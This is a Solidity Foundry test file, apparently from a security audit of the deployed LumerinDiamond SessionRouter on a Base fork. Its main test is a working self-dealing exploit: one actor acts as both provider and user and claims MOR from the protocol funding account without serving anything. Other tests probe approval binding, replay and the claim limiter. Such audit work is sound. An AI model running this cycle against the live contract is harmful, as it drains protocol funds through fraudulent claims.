// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IMOR {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address owner_, bytes32 baseModelId_) external pure returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getIsProviderApprovalUsed(bytes calldata approval_) external view returns (bool);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function getFundingAccount() external view returns (address);
    function getProvidersTotalClaimed() external view returns (uint256);
}

/// @notice MOR-C6 battery against the DEPLOYED LumerinDiamond SessionRouter facet (Base fork).
/// All actors are fresh keys funded with deal() (attacker capital is the actor's own).
/// The provider and the user are two wallets of the same "actor" for the farm cycle:
/// no third party, no real inference service, only time passing with a session open.
contract SessionRouterTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 52_725_925;
    uint256 constant PRICE = 1e16; // max allowed bid price: 0.01 MOR/s

    uint256 providerKey = 0xA11CE;
    uint256 userKey = 0xB0B;
    uint256 strangerKey = 0xBAD;
    address provider;
    address user;
    address stranger;
    address funding;

    bytes32 modelId;
    bytes32 bidId;

    function _sign(uint256 key_, bytes memory payload_) internal pure returns (bytes memory) {
        bytes32 digest_ = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload_)));
        (uint8 v_, bytes32 r_, bytes32 s_) = vm.sign(key_, digest_);
        return abi.encodePacked(r_, s_, v_);
    }

    function _approval(bytes32 bidId_, address user_, uint128 ts_) internal view returns (bytes memory) {
        return abi.encode(bidId_, uint256(8453), user_, ts_);
    }

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        provider = vm.addr(providerKey);
        user = vm.addr(userKey);
        stranger = vm.addr(strangerKey);
        funding = IDiamond(DIAMOND).getFundingAccount();

        deal(MOR, provider, 10_000 ether);
        deal(MOR, user, 200_000 ether);
        deal(MOR, stranger, 50_000 ether);

        vm.startPrank(provider);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);
        IDiamond(DIAMOND).providerRegister(provider, 5_000 ether, "https://provider.example");
        string[] memory tags_;
        IDiamond(DIAMOND).modelRegister(provider, bytes32("base-model"), bytes32("cid"), 0, 1 ether, "model", tags_);
        modelId = IDiamond(DIAMOND).getModelId(provider, bytes32("base-model"));
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId, PRICE);
        vm.stopPrank();

        vm.prank(user);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(stranger);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);
    }

    function _openAs(address opener_, address user_, uint256 amount_, bytes memory approval_, bytes memory sig_)
        internal
        returns (bytes32)
    {
        vm.prank(opener_);
        return IDiamond(DIAMOND).openSession(user_, amount_, false, approval_, sig_);
    }

    /// The full self-dealing cycle: one actor controls provider and user.
    /// Provider approval is self-signed; no inference is served; the session
    /// simply stays open until endsAt; the provider then claims from the
    /// funding account WITHOUT any close and WITHOUT any valid receipt.
    function testSybilFarmCycle() public {
        uint256 fundingBefore_ = IMOR(MOR).balanceOf(funding);
        uint256 providerBefore_ = IMOR(MOR).balanceOf(provider);
        uint256 userBefore_ = IMOR(MOR).balanceOf(user);

        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp));
        bytes memory sig_ = _sign(providerKey, approval_);
        bytes32 sessionId_ = _openAs(user, user, 100_000 ether, approval_, sig_);

        Session memory s_ = IDiamond(DIAMOND).getSession(sessionId_);
        assertTrue(s_.isActive, "session must be active");
        assertEq(IMOR(MOR).balanceOf(user), userBefore_ - 100_000 ether, "stake escrowed");

        // Let the session run to its end. No service is rendered anywhere.
        vm.warp(uint256(s_.endsAt) + 1);

        // Provider claims WITHOUT closing and WITHOUT any receipt at all.
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId_);

        uint256 providerGain_ = IMOR(MOR).balanceOf(provider) - providerBefore_;
        uint256 fundingLoss_ = fundingBefore_ - IMOR(MOR).balanceOf(funding);
        emit log_named_uint("provider gain (MOR wei)", providerGain_);
        emit log_named_uint("funding account loss (MOR wei)", fundingLoss_);
        assertGt(providerGain_, 200 ether, "provider must extract a material amount");
        assertEq(providerGain_, fundingLoss_, "provider gain must come from the funding account");

        // Conservation: a second claim pays nothing more.
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId_);
        assertEq(IMOR(MOR).balanceOf(provider) - providerBefore_, providerGain_, "second claim must pay 0");

        // User closes with a receipt signed by a STRANGER (invalid provider receipt).
        bytes memory receipt_ = abi.encode(sessionId_, uint256(8453), uint128(block.timestamp), uint32(0), uint32(0));
        bytes memory badSig_ = _sign(strangerKey, receipt_);
        vm.prank(user);
        IDiamond(DIAMOND).closeSession(receipt_, badSig_);
        s_ = IDiamond(DIAMOND).getSession(sessionId_);
        assertTrue(s_.closedAt != 0, "session must close even with an invalid provider receipt");

        // After the day-lock releases, the user recovers the locked remainder.
        vm.warp(block.timestamp + 2 days);
        vm.prank(user);
        IDiamond(DIAMOND).withdrawUserStakes(user, 255);

        uint256 userNet_ = IMOR(MOR).balanceOf(user);
        emit log_named_uint("user balance after full cycle", userNet_);
        emit log_named_uint("user balance before cycle", userBefore_);
        assertGe(userNet_, userBefore_ - 1 ether, "user capital must come back (near-)whole");
        // The pair (provider+user, same actor) is up providerGain_ minus the 0.3 MOR bid fee,
        // extracted from the protocol funding account for zero service.
        assertGt(providerGain_, 200 ether, "extraction must be material");
    }

    /// The approval encodes a user, but does openSession enforce it?
    function testApprovalNotBoundToUser() public {
        address otherUser_ = vm.addr(0xCAFE);
        deal(MOR, otherUser_, 20_000 ether);
        vm.prank(otherUser_);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);

        // Provider signed the approval for `user`, not for otherUser_.
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp));
        bytes memory sig_ = _sign(providerKey, approval_);

        vm.prank(otherUser_);
        try IDiamond(DIAMOND).openSession(otherUser_, 10_000 ether, false, approval_, sig_) returns (bytes32 sid_) {
            emit log_named_bytes32("OPENED with another user's approval, sessionId", sid_);
            emit log("FINDING: approval user binding NOT enforced");
        } catch {
            emit log("approval user binding enforced (reverted)");
        }
    }

    function testApprovalReplayReverts() public {
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp));
        bytes memory sig_ = _sign(providerKey, approval_);
        _openAs(user, user, 10_000 ether, approval_, sig_);
        assertTrue(IDiamond(DIAMOND).getIsProviderApprovalUsed(approval_), "approval must be marked used");
        vm.prank(user);
        vm.expectRevert();
        IDiamond(DIAMOND).openSession(user, 10_000 ether, false, approval_, sig_);
    }

    function testStrangerCannotOpenForUser() public {
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp));
        bytes memory sig_ = _sign(providerKey, approval_);
        vm.prank(stranger);
        vm.expectRevert();
        IDiamond(DIAMOND).openSession(user, 10_000 ether, false, approval_, sig_);
    }

    function testExpiredApprovalReverts() public {
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp) - 601);
        bytes memory sig_ = _sign(providerKey, approval_);
        vm.prank(user);
        vm.expectRevert();
        IDiamond(DIAMOND).openSession(user, 10_000 ether, false, approval_, sig_);
    }

    function testFutureDatedApproval() public {
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp) + 3600);
        bytes memory sig_ = _sign(providerKey, approval_);
        vm.prank(user);
        try IDiamond(DIAMOND).openSession(user, 10_000 ether, false, approval_, sig_) returns (bytes32 sid_) {
            emit log_named_bytes32("future-dated approval OPENED session", sid_);
        } catch {
            emit log("future-dated approval reverted");
        }
    }

    function testStrangerCannotClaimForProvider() public {
        bytes memory approval_ = _approval(bidId, user, uint128(block.timestamp));
        bytes memory sig_ = _sign(providerKey, approval_);
        bytes32 sessionId_ = _openAs(user, user, 10_000 ether, approval_, sig_);
        Session memory s_ = IDiamond(DIAMOND).getSession(sessionId_);
        vm.warp(uint256(s_.endsAt) + 1);
        vm.prank(stranger);
        vm.expectRevert();
        IDiamond(DIAMOND).claimForProvider(sessionId_);
    }
}

/// @notice Limiter probe: a provider registered at the 0.2 MOR minimum stake.
/// If the deployed limiter matches the source design, cumulative claims in the
/// 365-day window are capped at the provider's own stake (0.2 MOR total).
contract SessionRouterLimiterTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 52_725_925;
    uint256 constant PRICE = 1e16;

    uint256 providerKey = 0xD00D;
    uint256 userKey = 0xB0B;
    address provider;
    address user;
    bytes32 bidId;

    function _sign(uint256 key_, bytes memory payload_) internal pure returns (bytes memory) {
        bytes32 digest_ = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload_)));
        (uint8 v_, bytes32 r_, bytes32 s_) = vm.sign(key_, digest_);
        return abi.encodePacked(r_, s_, v_);
    }

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        provider = vm.addr(providerKey);
        user = vm.addr(userKey);
        deal(MOR, provider, 10 ether);
        deal(MOR, user, 100_000 ether);
        vm.startPrank(provider);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);
        IDiamond(DIAMOND).providerRegister(provider, 0.2 ether, "https://min.example");
        string[] memory tags_;
        IDiamond(DIAMOND).modelRegister(provider, bytes32("m"), bytes32("c"), 0, 0.1 ether, "m", tags_);
        bytes32 modelId_ = IDiamond(DIAMOND).getModelId(provider, bytes32("m"));
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId_, PRICE);
        vm.stopPrank();
        vm.prank(user);
        IMOR(MOR).approve(DIAMOND, type(uint256).max);
    }

    function testLimiterCapEqualsProviderStake() public {
        uint256 claimedTotal_ = 0;
        for (uint256 i_ = 0; i_ < 3; i_++) {
            bytes memory approval_ = abi.encode(bidId, uint256(8453), user, uint128(block.timestamp));
            bytes memory sig_ = _sign(providerKey, approval_);
            vm.prank(user);
            bytes32 sid_ = IDiamond(DIAMOND).openSession(user, 10_000 ether, false, approval_, sig_);
            Session memory s_ = IDiamond(DIAMOND).getSession(sid_);
            vm.warp(uint256(s_.endsAt) + 1);
            uint256 before_ = IMOR(MOR).balanceOf(provider);
            vm.prank(provider);
            IDiamond(DIAMOND).claimForProvider(sid_);
            claimedTotal_ += IMOR(MOR).balanceOf(provider) - before_;
        }
        emit log_named_uint("total claimed across 3 sessions (0.2 MOR min-stake provider)", claimedTotal_);
        // Full stipend for 3 sessions would be ~87.6 MOR. The limiter must cap at 0.2 MOR.
        assertLe(claimedTotal_, 0.2 ether, "limiter must cap cumulative claims at provider stake");
        assertGt(claimedTotal_, 0, "first claim must pay something");
    }
}
